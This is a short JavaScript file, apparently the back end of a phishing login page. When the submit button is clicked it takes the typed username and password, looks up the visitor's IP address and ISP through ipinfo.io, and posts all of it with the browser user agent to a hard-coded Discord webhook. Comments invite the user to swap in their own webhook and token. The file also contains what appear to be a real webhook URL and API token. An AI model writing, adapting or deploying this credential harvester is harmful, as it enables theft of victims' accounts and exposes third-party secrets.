async function sendData() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;

    if (!user || !pass) {
        console.log("User or password is empty.");
        return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your webhook URL

    const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1"); // Replace with your IPinfo token
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip || "[-] Unknown IP";
    const isp = ipData.org || "[-] Unknown ISP";
    const userAgent = navigator.userAgent;

    const payload = {
        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}\n**[+] IP Address:** ${ipAddress}\n**[+] ISP:** ${isp}\n**[+] User Agent:** ${userAgent}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Data sent successfully!");
        } else {
            console.error("Failed to send data:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error sending data:", error);
    }
}

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("submitBtn").addEventListener("click", sendData);
});